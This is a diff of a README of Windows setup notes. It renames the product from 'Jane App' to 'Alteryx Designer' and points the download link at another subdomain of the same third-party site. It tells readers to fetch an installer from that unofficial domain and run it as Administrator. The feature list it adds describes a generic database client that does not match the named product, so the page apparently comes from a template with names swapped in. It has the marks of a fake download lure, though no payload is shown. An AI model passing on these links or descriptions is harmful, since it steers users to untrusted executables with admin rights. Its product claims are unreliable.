@@ -1,10 +1,10 @@
-# Jane App Windows Setup Notes
+# Alteryx Designer Windows Setup Notes
 
-[⬇ Download Jane App for Windows](https://jane-app.kolmods.com/)
+**Download:** [Get Windows installer →](https://alteryx-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Jane App** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Alteryx Designer** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Jane App** from the Start menu
+5. Restart if the installer asks — then launch **Alteryx Designer** from the Start menu
 
 ## What you can use it for
 
-- Core Jane App features on Windows desktop
-- Install and configure Jane App for daily use
-- Import, edit, and export with Jane App tools
-- Tune settings and profiles inside Jane App
-- Integrate Jane App into your existing workflow
+- Connect to SQL and NoSQL database servers
+- Visual query builder and schema browsing
+- Import/export CSV, Excel, and backup dumps
+- ER diagrams and migration scripting
+- Scheduled jobs and data sync tasks
 
 ## License
 
